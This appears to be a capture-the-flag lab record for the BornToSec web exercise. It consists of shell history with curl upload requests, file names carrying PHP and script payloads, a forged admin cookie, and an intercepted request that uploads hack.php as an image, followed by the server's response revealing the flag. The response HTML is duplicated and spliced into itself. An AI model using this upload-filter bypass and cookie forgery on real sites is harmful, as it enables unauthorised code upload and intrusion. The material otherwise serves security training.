	133  curl -i -s -k -X  'POST'  \\n -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'  -H 'Pragma: no-cache'  -H 'Cache-Control: no-cache'  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: http://192.168.1.77/?page=upload'  -H 'Content-Length: 57'  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'  -H ''  \\n--data-binary $'MAX_FILE_SIZE=100000&uploaded=hack.png&Upload=Upload' \\n'http://192.168.1.77/?page=upload'
	134  touch "<?phpecho"<script>alert('HACKED')</script>";?>.jpg"
	135  touch <?phpecho"<script>alert('HACKED')</script>";?>.jpg
	136  touch <?phpecho"<script>alert('HACKED')<\/script>";?>.jpg
	137  touch <?phpecho"<script>alert('HACKED')<//script>";?>.jpg
	138  curl -i -s -k -X  'POST'  \\n -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'  -H 'Pragma: no-cache'  -H 'Cache-Control: no-cache'  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: http://192.168.1.77/?page=upload'  -H 'Content-Length: 57'  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'  -H ''  \\n--data-binary $'MAX_FILE_SIZE=100000&uploaded=hack.jpg&Upload=Upload' \\n'http://192.168.1.77/?page=upload'
	139  curl -i -s -k -X  'POST' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0'  -H 'Pragma: no-cache'  -H 'Cache-Control: no-cache'  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Referer: http://192.168.1.77/?page=upload'  -H 'Content-Length: 57'  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'  -H '' --data-binary $'MAX_FILE_SIZE=100000&uploaded=./hack.jpg&Upload=Upload' '192.168.1.77/?page=upload'

# REQUEST WITH TEMPER DATA

	POST http://192.168.1.77/?page=upload HTTP/1.1
	Host: 192.168.1.77
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Content-Type: multipart/form-data; boundary=---------------------------191268699940742326711755882763
	Content-Length: 515
	Origin: https://192.168.1.77
	Connection: keep-alive
	Referer: https://192.168.1.77/?page=upload
	Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1

	-----------------------------191268699940742326711755882763
	Content-Disposition: form-data; name="MAX_FILE_SIZE"

	100000
	-----------------------------191268699940742326711755882763
	Content-Disposition: form-data; name="uploaded"; filename="hack.php"
	Content-Type: image/jpg

	<?php
	echo "<script>alert('HACKED')</script>";
	?>
	-----------------------------191268699940742326711755882763
	Content-Disposition: form-data; name="Upload"

	Upload
	-----------------------------191268699940742326711755882763--


# RESPONSE

	HTTP/1.1 200 OK
	Server: nginx/1.8.0
	Date: Tue, 05 Apr 2022 17:08:06 GMT
	Content-Type: text/html
	Connection: keep-alive
	X-Powered-By: PHP/5.3.10-1ubuntu3.19

	<!DOCTYPE HTML>
	<html>	HTTP/1.1 200 OK
	Server: nginx/1.8.0
	Date: Tue, 05 Apr 2022 17:08:06 GMT
	Content-Type: text/html
	Connection: keep-alive
	X-Powered-By: PHP/5.3.10-1ubuntu3.19

	<!DOCTYPE HTML>
	<html>
		<head>
			<title>BornToSec - Web Section</title>
			<meta http-equiv="content-type" content="text/html; charset=utf-8" />
			<meta name="description" content="" />
			<meta name="keywords" content="" />
			<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
			<script src="js/jquery.min.js"></script>
			<script src="js/skel.min.js"></script>
			<script src="js/skel-layers.min.js"></script>
			<script src="js/init.js"></script>
			<noscript>
				<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
				<link rel="icon" type="image/x-icon" href="favicon.ico" />
				<link rel="stylesheet" href="css/skel.css" />
				<link rel="stylesheet" href="css/style.css" />
				<link rel="stylesheet" href="css/style-xlarge.css" />
			</noscript>
		</head>
		<body class="landing">
			<!-- Header -->
			<header id="header" >
									<a href=http://192.168.1.77><img src=http://192.168.1.77/images/42.jpeg height=82px width=82px/></a>
									<nav id="nav">
						<ul>
							<li><a href="index.php">Home</a></li>
							<li><a href="?page=survey">Survey</a></li>
							<li><a href="?page=member">Members</a></li>
						</ul>
					</nav>
				</header>

			<!-- Main -->
				<section id="main" class="wrapper">
					<div class="container" style="margin-top:75px">
	<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/hack.php succesfully uploaded.</pre>
	<table width=50%>
		<tr style="background-color:transparent;border:none;"><td colspan=2><h2 align=center>File upload:</h2></td></tr>

		<tr style="background-color:transparent;border:none;">
					<td align=center style="vertical-align:middle;">
				<img src="images/upload.png" width=150px/>
			</td>
			<td>
	<form enctype="multipart/form-data" action="#" method="POST">

		<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
		Choose an image to upload:
		<br />
		<input name="uploaded" type="file" /><br />
		<br />
		<input type="submit" name="Upload" value="Upload">

		</form>

			</td>
		</tr>
	</table>
					</div>
				</section>
			<!-- Footer -->
				<footer id="footer">
					<div class="container">
						<ul class="icons">
							<li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
							<li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
							<li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
						</ul>
						<ul class="copyright">
							<a href="?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"><li>&copy; BornToSec</li></a>
						</ul>
					</div>
				</footer>
		</body>
	</html>
		<head>
			<title>BornToSec - Web Section</title>
			<meta http-equiv="content-type" content="text/html; charset=utf-8" />
			<meta name="description" content="" />
			<meta name="keywords" content="" />
			<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
			<script src="js/jquery.min.js"></script>
			<script src="js/skel.min.js"></script>
			<script src="js/skel-layers.min.js"></script>
			<script src="js/init.js"></script>
			<noscript>
				<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
				<link rel="icon" type="image/x-icon" href="favicon.ico" />
				<link rel="stylesheet" href="css/skel.css" />
				<link rel="stylesheet" href="css/style.css" />
				<link rel="stylesheet" href="css/style-xlarge.css" />
			</noscript>
		</head>
		<body class="landing">
			<!-- Header -->
			<header id="header" >
									<a href=http://192.168.1.77><img src=http://192.168.1.77/images/42.jpeg height=82px width=82px/></a>
									<nav id="nav">
						<ul>
							<li><a href="index.php">Home</a></li>
							<li><a href="?page=survey">Survey</a></li>
							<li><a href="?page=member">Members</a></li>
						</ul>
					</nav>
				</header>

			<!-- Main -->
				<section id="main" class="wrapper">
					<div class="container" style="margin-top:75px">
	<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/hack.php succesfully uploaded.</pre>
	<table width=50%>
		<tr style="background-color:transparent;border:none;"><td colspan=2><h2 align=center>File upload:</h2></td></tr>

		<tr style="background-color:transparent;border:none;">
					<td align=center style="vertical-align:middle;">
				<img src="images/upload.png" width=150px/>
			</td>
			<td>
	<form enctype="multipart/form-data" action="#" method="POST">

		<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
		Choose an image to upload:
		<br />
		<input name="uploaded" type="file" /><br />
		<br />
		<input type="submit" name="Upload" value="Upload">

		</form>

			</td>
		</tr>
	</table>
					</div>
				</section>
			<!-- Footer -->
				<footer id="footer">
					<div class="container">
						<ul class="icons">
							<li><a href="index.php?page=redirect&site=facebook" class="icon fa-facebook"></a></li>
							<li><a href="index.php?page=redirect&site=twitter" class="icon fa-twitter"></a></li>
							<li><a href="index.php?page=redirect&site=instagram" class="icon fa-instagram"></a></li>
						</ul>
						<ul class="copyright">
							<a href="?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"><li>&copy; BornToSec</li></a>
						</ul>
					</div>
				</footer>
		</body>
	</html>